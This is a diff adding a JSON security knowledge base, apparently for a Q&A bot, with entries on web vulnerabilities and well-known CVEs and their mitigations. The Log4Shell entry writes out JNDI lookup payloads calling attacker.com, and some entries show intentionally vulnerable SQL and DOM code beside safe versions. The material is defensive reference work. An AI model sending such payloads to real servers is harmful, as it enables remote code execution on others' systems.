@@ -1,0 +1,302 @@
+[
+  {
+    "id": "kb-sec-sql-injection",
+    "title": "SQL Injection (SQLi)",
+    "category": "security",
+    "tags": ["security", "sql injection", "sqli", "owasp", "database"],
+    "content": "SQL Injection occurs when untrusted input is concatenated into SQL queries. Attackers can bypass auth, read/write data, or execute commands. Prevention: parameterized queries, ORM, input validation, least privilege DB accounts, WAF.",
+    "snippet": "-- Vulnerable\nquery = f\"SELECT * FROM users WHERE email = '{email}'\"\n\n-- Safe (parameterized)\nquery = \"SELECT * FROM users WHERE email = %s\"\ncursor.execute(query, (email,))",
+    "answers": [
+      "what is sql injection",
+      "how to prevent sql injection",
+      "sql injection example",
+      "parameterized queries",
+      "owasp sql injection"
+    ]
+  },
+  {
+    "id": "kb-sec-xss",
+    "title": "Cross-Site Scripting (XSS)",
+    "category": "security",
+    "tags": ["security", "xss", "cross-site scripting", "owasp", "javascript"],
+    "content": "XSS injects malicious scripts into web pages viewed by others. Types: stored, reflected, DOM-based. Impact: session theft, account takeover, keylogging. Prevention: output encoding, CSP headers, sanitize input, HttpOnly cookies.",
+    "snippet": "// Vulnerable\ninnerHTML = userInput;\n\n// Safe\ntextContent = userInput;\n\n// CSP header\nContent-Security-Policy: default-src 'self'; script-src 'self'",
+    "answers": [
+      "what is xss",
+      "how to prevent xss",
+      "xss types stored reflected dom",
+      "content security policy",
+      "xss attack example"
+    ]
+  },
+  {
+    "id": "kb-sec-csrf",
+    "title": "Cross-Site Request Forgery (CSRF)",
+    "category": "security",
+    "tags": ["security", "csrf", "xsrf", "owasp", "tokens"],
+    "content": "CSRF tricks authenticated users into submitting unwanted requests. Attacker crafts malicious page that triggers state-changing requests. Prevention: CSRF tokens, SameSite cookies, double-submit cookies, custom headers, origin checking.",
+    "snippet": "// CSRF token in form\n<input type=\"hidden\" name=\"csrf_token\" value=\"{{ token }}\">\n\n// SameSite cookie\nSet-Cookie: session=abc; SameSite=Strict; HttpOnly; Secure\n\n// Custom header check\nX-Requested-With: XMLHttpRequest",
+    "answers": [
+      "what is csrf",
+      "how to prevent csrf",
+      "csrf token",
+      "samesite cookie",
+      "csrf vs xss"
+    ]
+  },
+  {
+    "id": "kb-sec-auth",
+    "title": "Authentication & Session Security",
+    "category": "security",
+    "tags": ["security", "authentication", "session", "jwt", "password", "2fa"],
+    "content": "Secure auth: bcrypt/argon2 password hashing, session rotation, JWT with short expiry, 2FA/TOTP, rate limiting, account lockout, secure cookie flags (HttpOnly, Secure, SameSite), password strength policies.",
+    "snippet": "// Password hashing (bcrypt)\nimport bcrypt\nhash = bcrypt.hashpw(password.encode(), bcrypt.gensalt(12))\n\n// JWT best practices\n{\n  \"alg\": \"HS256\",\n  \"exp\": 900,  // 15 min\n  \"iss\": \"professionalai.com\"\n}",
+    "answers": [
+      "secure authentication",
+      "password hashing best practices",
+      "jwt security",
+      "session management",
+      "2fa totp"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2021-44228",
+    "title": "CVE-2021-44228 — Log4Shell",
+    "category": "security",
+    "tags": ["security", "cve", "log4shell", "log4j", "rce", "java"],
+    "content": "Log4Shell: critical RCE in Apache Log4j 2. Attackers send ${jndi:ldap://...} strings that trigger JNDI lookups, enabling remote code execution. Affects Java apps. Fix: upgrade to Log4j 2.17.1+, disable JNDI, block outbound LDAP.",
+    "snippet": "# Detection\n${jndi:ldap://attacker.com/a}\n${jndi:dns://attacker.com}\n\n# Mitigation (Log4j 2.10+)\n-Dlog4j2.formatMsgNoLookups=true\n\n# Fix: upgrade to 2.17.1+",
+    "answers": [
+      "log4shell",
+      "cve-2021-44228",
+      "log4j vulnerability",
+      "log4j rce fix",
+      "jndi lookup exploit"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2017-0144",
+    "title": "CVE-2017-0144 — EternalBlue (SMB)",
+    "category": "security",
+    "tags": ["security", "cve", "eternalblue", "smb", "ransomware", "wannacry"],
+    "content": "EternalBlue: critical SMBv1 vulnerability in Windows. Exploited by WannaCry ransomware. Allows remote code execution via crafted SMB packets. Fix: patch MS17-010, disable SMBv1, block port 445 at firewall.",
+    "snippet": "# Check SMBv1 status\nGet-SmbServerConfiguration | Select EnableSMB1Protocol\n\n# Disable SMBv1\nSet-SmbServerConfiguration -EnableSMB1Protocol $false\n\n# Block port 445\nnetsh advfirewall firewall add rule dir=in action=block protocol=TCP localport=445",
+    "answers": [
+      "eternalblue",
+      "cve-2017-0144",
+      "wannacry",
+      "smb vulnerability",
+      "disable smbv1"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2023-44487",
+    "title": "CVE-2023-44487 — HTTP/2 Rapid Reset",
+    "category": "security",
+    "tags": ["security", "cve", "http2", "ddos", "rapid reset"],
+    "content": "HTTP/2 Rapid Reset: DDoS amplification via rapid stream cancellation. Attackers open many streams then immediately reset them, exhausting server resources. Fix: apply vendor patches, rate limit streams, upgrade HTTP/2 implementations.",
+    "snippet": "# Mitigation strategies\n- Apply vendor patches (nginx, Apache, Node.js)\n- Limit concurrent streams per connection\n- Monitor RST_STREAM rates\n- Use DDoS protection services",
+    "answers": [
+      "http2 rapid reset",
+      "cve-2023-44487",
+      "http2 ddos",
+      "stream reset attack",
+      "nginx http2 patch"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2021-34527",
+    "title": "CVE-2021-34527 — PrintNightmare",
+    "category": "security",
+    "tags": ["security", "cve", "printnightmare", "windows", "rce", "print spooler"],
+    "content": "PrintNightmare: RCE in Windows Print Spooler. Allows remote code execution with SYSTEM privileges via crafted print jobs. Fix: apply patches, disable Print Spooler if unused, restrict Point and Print.",
+    "snippet": "# Disable Print Spooler (if not needed)\nStop-Service Spooler\nSet-Service Spooler -StartupType Disabled\n\n# Registry hardening\nHKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Printers\\PointAndPrint\nNoWarningNoElevationOnInstall = 0",
+    "answers": [
+      "printnightmare",
+      "cve-2021-34527",
+      "print spooler vulnerability",
+      "windows rce",
+      "disable print spooler"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2021-26855",
+    "title": "CVE-2021-26855 — ProxyLogon (Exchange)",
+    "category": "security",
+    "tags": ["security", "cve", "proxylogon", "exchange", "microsoft"],
+    "content": "ProxyLogon: SSRF in Microsoft Exchange Server allowing unauthenticated RCE. Chain with CVE-2021-27065 for webshell deployment. Fix: apply March 2021 patches, check for webshells, audit logs.",
+    "snippet": "# Check for webshells\nGet-ChildItem -Path C:\\inetpub\\wwwroot -Recurse -Filter *.aspx\n\n# Check for suspicious files\nGet-ChildItem -Path C:\\inetpub\\wwwroot\\aspnet_client -Recurse",
+    "answers": [
+      "proxylogon",
+      "cve-2021-26855",
+      "exchange vulnerability",
+      "exchange webshell",
+      "microsoft exchange rce"
+    ]
+  },
+  {
+    "id": "kb-sec-owasp-top10",
+    "title": "OWASP Top 10 (2021)",
+    "category": "security",
+    "tags": ["security", "owasp", "top 10", "web security"],
+    "content": "OWASP Top 10 2021: A01 Broken Access Control, A02 Cryptographic Failures, A03 Injection, A04 Insecure Design, A05 Security Misconfiguration, A06 Vulnerable Components, A07 Auth Failures, A08 Integrity Failures, A09 Logging Failures, A10 SSRF.",
+    "snippet": "A01: Broken Access Control\nA02: Cryptographic Failures\nA03: Injection\nA04: Insecure Design\nA05: Security Misconfiguration\nA06: Vulnerable and Outdated Components\nA07: Identification and Authentication Failures\nA08: Software and Data Integrity Failures\nA09: Security Logging and Monitoring Failures\nA10: Server-Side Request Forgery (SSRF)",
+    "answers": [
+      "owasp top 10",
+      "owasp 2021",
+      "web application security",
+      "top 10 vulnerabilities",
+      "owasp list"
+    ]
+  },
+  {
+    "id": "kb-sec-encryption",
+    "title": "Encryption & Hashing Explained",
+    "category": "security",
+    "tags": ["security", "encryption", "hashing", "aes", "rsa", "sha256"],
+    "content": "Encryption is reversible (AES, RSA). Hashing is one-way (SHA-256, bcrypt). Symmetric uses one key (AES-256-GCM). Asymmetric uses key pairs (RSA, ECC). Use AES-256-GCM for data at rest, TLS 1.3 for transit, bcrypt/argon2 for passwords.",
+    "snippet": "# AES-256-GCM (Python)\nfrom cryptography.hazmat.primitives.ciphers.aead import AESGCM\nkey = AESGCM.generate_key(bit_length=256)\naesgcm = AESGCM(key)\nct = aesgcm.encrypt(nonce, b'data', None)\n\n# Password hashing\nbcrypt.hashpw(password.encode(), bcrypt.gensalt(12))",
+    "answers": [
+      "encryption vs hashing",
+      "aes 256",
+      "rsa vs aes",
+      "sha256",
+      "best encryption algorithm"
+    ]
+  },
+  {
+    "id": "kb-sec-ssrf",
+    "title": "Server-Side Request Forgery (SSRF)",
+    "category": "security",
+    "tags": ["security", "ssrf", "owasp", "server-side"],
+    "content": "SSRF: attacker makes server fetch arbitrary URLs, accessing internal services, cloud metadata (169.254.169.254), or localhost. Prevention: allowlist domains, block private IPs, validate redirects, disable unnecessary protocols.",
+    "snippet": "# Block private IPs\nimport ipaddress\nip = ipaddress.ip_address(hostname)\nif ip.is_private or ip.is_loopback or ip.is_link_local:\n    raise ValueError('Blocked')\n\n# Cloud metadata\n169.254.169.254  # AWS/GCP/Azure metadata",
+    "answers": [
+      "what is ssrf",
+      "ssrf prevention",
+      "cloud metadata attack",
+      "ssrf example",
+      "block private ip ssrf"
+    ]
+  },
+  {
+    "id": "kb-sec-api-security",
+    "title": "API Security Best Practices",
+    "category": "security",
+    "tags": ["security", "api", "rest", "rate limiting", "jwt", "oauth"],
+    "content": "API security: authentication (OAuth2/JWT), authorization (RBAC), rate limiting, input validation, HTTPS/TLS, CORS restrictions, API keys rotation, audit logging, error handling without info leak, versioning.",
+    "snippet": "// Security headers\nStrict-Transport-Security: max-age=31536000\nContent-Security-Policy: default-src 'self'\nX-Content-Type-Options: nosniff\nX-Frame-Options: DENY\n\n// Rate limit\nX-RateLimit-Limit: 100\nX-RateLimit-Remaining: 99",
+    "answers": [
+      "api security",
+      "rest api security",
+      "rate limiting api",
+      "oauth2 vs jwt",
+      "api authentication best practices"
+    ]
+  },
+  {
+    "id": "kb-sec-zero-trust",
+    "title": "Zero Trust Security Model",
+    "category": "security",
+    "tags": ["security", "zero trust", "network", "identity"],
+    "content": "Zero Trust: never trust, always verify. Principles: verify explicitly, least privilege access, assume breach. Components: MFA, device compliance, micro-segmentation, continuous monitoring, identity-based access.",
+    "snippet": "Zero Trust Pillars:\n1. Identity - MFA, SSO\n2. Device - compliance checks\n3. Network - micro-segmentation\n4. Data - encryption, DLP\n5. Workload - secure containers\n6. Visibility - continuous monitoring",
+    "answers": [
+      "zero trust",
+      "zero trust architecture",
+      "never trust always verify",
+      "zero trust model",
+      "micro-segmentation"
+    ]
+  },
+  {
+    "id": "kb-sec-password-security",
+    "title": "Password Security & NIST Guidelines",
+    "category": "security",
+    "tags": ["security", "password", "nist", "passphrase", "password manager"],
+    "content": "NIST guidelines: use passphrases (15+ chars), check against breach lists, allow paste in password fields, no forced periodic rotation, support all characters, rate-limit attempts, use password managers.",
+    "snippet": "Strong passphrase example:\ncorrect-horse-battery-staple\n\nNIST SP 800-63B:\n- Length > 15 chars\n- Check against breached passwords\n- No composition rules (no forced symbols)\n- No periodic rotation\n- Allow paste\n- Rate limit login attempts",
+    "answers": [
+      "password security",
+      "nist password guidelines",
+      "strong password",
+      "passphrase",
+      "password manager"
+    ]
+  },
+  {
+    "id": "kb-sec-tls",
+    "title": "TLS/HTTPS Explained",
+    "category": "security",
+    "tags": ["security", "tls", "https", "ssl", "certificates"],
+    "content": "TLS encrypts data in transit. TLS 1.3 is current standard. Certificates verify identity via CA chain. HSTS forces HTTPS. Key exchange: ECDHE. Cipher suites: AES-256-GCM, ChaCha20. Disable TLS 1.0/1.1.",
+    "snippet": "# Strong TLS config (nginx)\nssl_protocols TLSv1.2 TLSv1.3;\nssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256;\nssl_prefer_server_ciphers off;\nssl_session_tickets off;\nadd_header Strict-Transport-Security \"max-age=63072000\" always;",
+    "answers": [
+      "how does tls work",
+      "https vs http",
+      "tls 1.3",
+      "ssl certificate",
+      "hsts"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2014-0160",
+    "title": "CVE-2014-0160 — Heartbleed",
+    "category": "security",
+    "tags": ["security", "cve", "heartbleed", "openssl", "tls"],
+    "content": "Heartbleed: buffer over-read in OpenSSL heartbeat extension. Allows reading server memory including private keys, passwords, session tokens. Affects OpenSSL 1.0.1-1.0.1f. Fix: upgrade OpenSSL, revoke/reissue certificates, rotate secrets.",
+    "snippet": "# Detection\nopenssl s_client -connect host:443 -tlsextdebug 2>&1 | grep 'server extension'\n\n# Fix\n- Upgrade to OpenSSL 1.0.1g+\n- Reissue all certificates\n- Rotate all passwords/keys\n- Invalidate sessions",
+    "answers": [
+      "heartbleed",
+      "cve-2014-0160",
+      "openssl vulnerability",
+      "heartbeat extension",
+      "reissue certificates"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2019-19781",
+    "title": "CVE-2019-19781 — Citrix ADC",
+    "category": "security",
+    "tags": ["security", "cve", "citrix", "adc", "netscaler"],
+    "content": "CVE-2019-19781: directory traversal in Citrix ADC/NetScaler allowing unauthenticated RCE. Exploited for webshells and ransomware. Fix: apply vendor patches, check for webshells, restrict management access.",
+    "snippet": "# Check for webshells\nfind /var/tmp -name '*.pl' -o -name '*.xml'\n\n# Mitigation\n- Apply Citrix patches\n- Block external access to management UI\n- Check /netscaler/portal/templates/",
+    "answers": [
+      "citrix vulnerability",
+      "cve-2019-19781",
+      "netscaler rce",
+      "citrix webshell",
+      "directory traversal citrix"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2020-1472",
+    "title": "CVE-2020-1472 — Zerologon",
+    "category": "security",
+    "tags": ["security", "cve", "zerologon", "netlogon", "active directory"],
+    "content": "Zerologon: privilege escalation in Netlogon (MS-NRPC). Attacker can impersonate domain controller and take over Active Directory. Fix: apply August 2020 patches, enforce secure RPC, monitor Event ID 5827/5828.",
+    "snippet": "# Check for vulnerable DCs\nTest-ComputerSecureChannel -Repair\n\n# Monitor\nEvent ID 5827: Netlogon secure channel denied\nEvent ID 5828: Netlogon secure channel allowed\n\n# Fix: Apply KB4565349+",
+    "answers": [
+      "zerologon",
+      "cve-2020-1472",
+      "netlogon vulnerability",
+      "active directory takeover",
+      "secure netlogon rpc"
+    ]
+  },
+  {
+    "id": "kb-sec-cve-2023-23397",
+    "title": "CVE-2023-23397 — Outlook NTLM",
+    "category": "security",
+    "tags": ["security", "cve", "outlook", "ntlm", "microsoft"],
+    "content": "CVE-2023-23397: Outlook vulnerability allowing NTLM credential theft via crafted calendar invites. Attacker sends meeting with UNC path triggering NTLM hash leak. Fix: apply March 2023 patches, block TCP 445 outbound, add firewall rules.",
+    "snippet": "# Mitigation\n- Apply March 2023 Outlook patches\n- Block outbound SMB (TCP 445)\n- Add users to Protected Users group\n- Enable Extended Protection for Authentication",
+    "answers": [
+      "outlook vulnerability",
+      "cve-2023-23397",
+      "ntlm credential theft",
+      "calendar invite exploit",
+      "block smb outbound"
+    ]
+  }
+]
